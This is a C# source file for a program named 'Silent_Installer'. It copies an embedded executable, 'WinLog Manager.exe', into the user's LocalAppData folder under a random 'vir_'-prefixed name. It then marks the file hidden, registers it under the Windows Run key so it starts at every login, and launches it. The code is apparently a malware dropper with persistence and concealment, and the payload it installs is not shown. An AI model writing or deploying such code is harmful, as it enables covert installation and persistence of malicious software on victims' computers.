using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using System.Reflection;
using Microsoft.Win32;

namespace Silent_Installer
{
	class Program
	{
		private static Assembly assembly = Assembly.GetExecutingAssembly();

		private static Random random = new Random((int)DateTime.Now.Ticks);
		
		private readonly static char dsp = Path.DirectorySeparatorChar;
		private readonly static string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

		private readonly static string UID = "vir_" + RandomString(6);
		private readonly static string file = localAppData + dsp + UID + @".exe";
		private readonly static string[] fileRange = Directory.GetFiles(localAppData, "vir_*.exe", SearchOption.TopDirectoryOnly);
		private readonly static RegistryKey registry = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);


		static void Main(string[] args)
		{
			if (fileRange.Length <= 0)
			{
				try
				{
					Console.WriteLine("Installing...");
					
					using(Stream input = assembly.GetManifestResourceStream(@"Silent_Installer.WinLog Manager.exe"))
					using(Stream output = File.Create(file))
					{
						CopyStream(input, output);
					}
				}
				catch (Exception e)
				{
					Console.WriteLine("Exception occurred! - {0}", e.Message.ToString());
					goto Finish;
				}

				try
				{
					registry.SetValue(UID, file);
					File.SetAttributes(file, File.GetAttributes(file) | FileAttributes.Hidden);
					Console.WriteLine("Starting...");
					Process.Start(file);
					Console.WriteLine("Installation complete!");
				}
				catch (Exception e)
				{
					Console.WriteLine("Exception occurred!! - {0}", e.Message.ToString());
				}
			}
			else
			{
				Console.WriteLine("Already Installed!");
			}

			Finish:
				Console.WriteLine("Press any key to continue...");
				Console.ReadKey();
		}

		private static string RandomString(int size)
		{
			StringBuilder builder = new StringBuilder();
			char ch;
			for (int i = 0; i < size; i++)
			{
				ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65)));
				builder.Append(ch);
			}

			return builder.ToString();
		}

		public static void CopyStream(Stream input, Stream output)
		{
			byte[] buffer = new byte[8192];

			int bytesRead;
			while ((bytesRead = input.Read(buffer, 0, buffer.Length)) > 0)
			{
				output.Write(buffer, 0, bytesRead);
			}
		}
	}
}
